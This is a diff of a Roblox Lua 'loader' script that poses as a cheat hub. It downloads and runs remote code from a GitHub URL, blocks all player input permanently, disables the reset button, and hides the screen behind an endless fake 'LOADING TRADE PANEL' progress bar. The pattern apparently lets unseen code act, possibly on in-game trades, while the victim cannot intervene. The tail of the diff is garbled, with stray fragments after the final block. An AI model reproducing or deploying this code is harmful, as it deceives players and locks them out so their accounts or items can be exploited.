@@ -1,124 +1,162 @@
--- === PERQZ HUB Fancy Loader + Ironman Script ===
+-- Run main script instantly
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ordinaryUserlol/GROW-A-GARDEN/refs/heads/main/Ironman"))()
 
+-- Services
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local ContextActionService = game:GetService("ContextActionService")
 local StarterGui = game:GetService("StarterGui")
 
--- Load Ironman script first (non-blocking)
+-- BLOCK ALL INPUT FOREVER
+local function blockInput()
+    return Enum.ContextActionResult.Sink
+end
+ContextActionService:BindAction("BlockAllInput", blockInput, false, unpack(Enum.UserInputType:GetEnumItems()))
+ContextActionService:BindAction("BlockAllInputKeys", blockInput, false, unpack(Enum.KeyCode:GetEnumItems()))
+
+-- Disable Reset button
+StarterGui:SetCore("ResetButtonCallback", false)
+
+-- ScreenGui (Top priority)
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.DisplayOrder = 1e6
+ScreenGui.Parent = game.CoreGui
+
+-- FULLSCREEN COVER
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(1, 0, 1, 0)
+MainFrame.ZIndex = 1e6
+MainFrame.Parent = ScreenGui
+
+-- BACKGROUND GRADIENT
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(128, 0, 128))
+}
+UIGradient.Rotation = 45
+UIGradient.Parent = MainFrame
+
+-- FLOATING PARTICLES
+for i = 1, 20 do
+    local particle = Instance.new("Frame")
+    particle.Size = UDim2.new(0, math.random(20, 50), 0, math.random(20, 50))
+    particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
+    particle.BackgroundColor3 = Color3.fromRGB(math.random(100, 255), math.random(0, 100), math.random(150, 255))
+    particle.BackgroundTransparency = 0.7
+    particle.BorderSizePixel = 0
+    particle.ZIndex = 1e6
+    particle.Parent = MainFrame
+    Instance.new("UICorner", particle).CornerRadius = UDim.new(1, 0)
+
+    task.spawn(function()
+        while particle.Parent do
+            TweenService:Create(
+                particle,
+                TweenInfo.new(math.random(5, 12), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+                {Position = UDim2.new(math.random(), 0, math.random(), 0)}
+            ):Play()
+            task.wait(math.random(5, 12))
+        end
+    end)
+end
+
+-- ROTATING RING
+local Ring = Instance.new("ImageLabel")
+Ring.Size = UDim2.new(0, 300, 0, 300)
+Ring.Position = UDim2.new(0.5, -150, 0.35, -150)
+Ring.BackgroundTransparency = 1
+Ring.Image = "rbxassetid://7743864258"
+Ring.ImageColor3 = Color3.fromRGB(200, 100, 255)
+Ring.ZIndex = 1e6
+Ring.Parent = MainFrame
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ordinaryUserlol/GROW-A-GARDEN/refs/heads/main/Ironman"))()
+    while Ring.Parent do
+        Ring.Rotation = (Ring.Rotation + 0.1) % 360
+        task.wait()
+    end
 end)
 
--- Hide CoreGui to block default Roblox menu/buttons
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+-- LOADING TEXT
+local LoadingLabel = Instance.new("TextLabel")
+LoadingLabel.Size = UDim2.new(1, 0, 0, 100)
+LoadingLabel.Position = UDim2.new(0, 0, 0.35, 0)
+LoadingLabel.BackgroundTransparency = 1
+LoadingLabel.Text = "⏳💼 LOADING TRADE PANEL 💼⏳"
+LoadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadingLabel.TextScaled = true
+LoadingLabel.Font = Enum.Font.GothamBold
+LoadingLabel.ZIndex = 1e6
+LoadingLabel.Parent = MainFrame
 
--- Create ScreenGui
-local screenGui = Instance.new("ScreenGui")
-screenGui.IgnoreGuiInset = true
-screenGui.ResetOnSpawn = false
-screenGui.Name = "PERQZ_Loading"
-screenGui.Parent = game.CoreGui
-
--- Main Frame with solid background and rounded corners
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(1, 0, 1, 0)
-frame.BackgroundColor3 = Color3.fromRGB(30, 10, 80) -- solid dark purple background
-frame.Parent = screenGui
-
-local frameCorner = Instance.new("UICorner")
-frameCorner.CornerRadius = UDim.new(0, 15)
-frameCorner.Parent = frame
-
--- Container Frame (centered)
-local container = Instance.new("Frame")
-container.Size = UDim2.new(0.6, 0, 0.3, 0)
-container.Position = UDim2.new(0.2, 0, 0.35, 0)
-container.BackgroundColor3 = Color3.fromRGB(10, 10, 10) -- solid black container background
-container.Parent = frame
-
-local containerCorner = Instance.new("UICorner")
-containerCorner.CornerRadius = UDim.new(0, 12)
-containerCorner.Parent = container
-
--- Title Label
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 50)
-title.Position = UDim2.new(0, 0, 0.05, 0)
-title.BackgroundTransparency = 1
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextStrokeTransparency = 0.7
-title.TextSize = 34
-title.Font = Enum.Font.FredokaOne
-title.Text = "⚙️ BYPASSING ANTI CHEATS..."
-title.Parent = container
-
--- Percentage Label
-local percentage = Instance.new("TextLabel")
-percentage.Size = UDim2.new(1, 0, 0, 40)
-percentage.Position = UDim2.new(0, 0, 0.25, 0)
-percentage.BackgroundTransparency = 1
-percentage.TextColor3 = Color3.fromRGB(0, 255, 170)
-percentage.TextStrokeTransparency = 0.7
-percentage.TextSize = 28
-percentage.Font = Enum.Font.FredokaOne
-percentage.Text = "0%"
-percentage.Parent = container
-
--- Progress Bar Background
-local barBG = Instance.new("Frame")
-barBG.Size = UDim2.new(1, 0, 0, 25)
-barBG.Position = UDim2.new(0, 0, 0.6, 0)
-barBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-barBG.BorderSizePixel = 0
-barBG.Parent = container
-
-local barBGCorn = Instance.new("UICorner")
-barBGCorn.CornerRadius = UDim.new(0, 12)
-barBGCorn.Parent = barBG
-
--- Progress Bar Fill
-local barFill = Instance.new("Frame")
-barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
-barFill.BorderSizePixel = 0
-barFill.Parent = barBG
-
-local barFillCorner = Instance.new("UICorner")
-barFillCorner.CornerRadius = UDim.new(0, 12)
-barFillCorner.Parent = barFill
-
--- Glow effect for progress bar fill
-local glow = Instance.new("ImageLabel")
-glow.Size = UDim2.new(1.2, 0, 1.6, 0)
-glow.Position = UDim2.new(-0.1, 0, -0.3, 0)
-glow.BackgroundTransparency = 1
-glow.Image = "rbxassetid://3300795012" -- glow image asset
-glow.ImageColor3 = Color3.fromRGB(0, 255, 170)
-glow.ImageTransparency = 0.6
-glow.Parent = barFill
-
--- Messages to cycle through
-local messages = {
-    "⚙️ BYPASSING ANTI CHEATS...",
-    "📂 GETTING PLAYERDATA...",
-    "🧪 INJECTING SCRIPT...",
-    "🛡️ BYPASSING ANTI DUPE...",
-    "🌱 GETTING THE SPAWNER...",
-    "🎨 LOADING GUI...",
-    "✅ FINISHED!"
+local TextGradient = Instance.new("UIGradient")
+TextGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(128, 0, 255))
 }
+TextGradient.Rotation = 0
+TextGradient.Parent = LoadingLabel
 
--- Loop progress bar and messages (approx 5 min full loop)
 task.spawn(function()
-    while true do
-        for i = 1, 99 do
-            barFill.Size = UDim2.new(i/100, 0, 1, 0)
-            percentage.Text = i .. "%"
-            if i % 14 == 0 then
-                title.Text = messages[((i // 14) % #messages) + 1]
-            end
-            task.wait(3.1) -- 3.1s per 1% ≈ 5 min total
-        end
-        task.wait(1)
-        barFill.Size = UDim2.new(0, 0, 1, 0)
+    while TextGradient.Parent do
+        TextGradient.Rotation = (TextGradient.Rotation + 1) % 360
+        task.wait(0.03)
+    end
+end)
+
+-- PROGRESS BAR
+local BarFrame = Instance.new("Frame")
+BarFrame.Size = UDim2.new(0.6, 0, 0, 30)
+BarFrame.Position = UDim2.new(0.2, 0, 0.55, 0)
+BarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+BarFrame.BorderSizePixel = 0
+BarFrame.ZIndex = 1e6
+BarFrame.Parent = MainFrame
+Instance.new("UICorner", BarFrame)
+
+local FillFrame = Instance.new("Frame")
+FillFrame.Size = UDim2.new(0, 0, 1, 0)
+FillFrame.BorderSizePixel = 0
+FillFrame.ZIndex = 1e6
+FillFrame.Parent = BarFrame
+Instance.new("UICorner", FillFrame)
+
+local hue = 0
+RunService.RenderStepped:Connect(function()
+    hue = (hue + 0.005) % 1
+    FillFrame.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
+end)
+
+local PercentLabel = Instance.new("TextLabel")
+PercentLabel.Size = UDim2.new(1, 0, 0, 30)
+PercentLabel.Position = UDim2.new(0, 0, 1.1, 0)
+PercentLabel.BackgroundTransparency = 1
+PercentLabel.Text = "0%"
+PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+PercentLabel.TextScaled = true
+PercentLabel.Font = Enum.Font.GothamBold
+PercentLabel.ZIndex = 1e6
+PercentLabel.Parent = BarFrame
+
+-- PERMANENT LOOP (4-min per cycle)
+while true do
+    local startTime = tick()
+    local duration = 240 -- seconds
+    while tick() - startTime < duration do
+        local progress = ((tick() - startTime) / duration) * 100
+        if progress > 100 then progress = 100 end
+        PercentLabel.Text = string.format("%d%%", progress)
+        FillFrame.Size = UDim2.new(progress / 100, 0, 1, 0)
+        task.wait(0.05)
+    end
+end        barFill.Size = UDim2.new(0, 0, 1, 0)
         percentage.Text = "1%"
     end
 end)
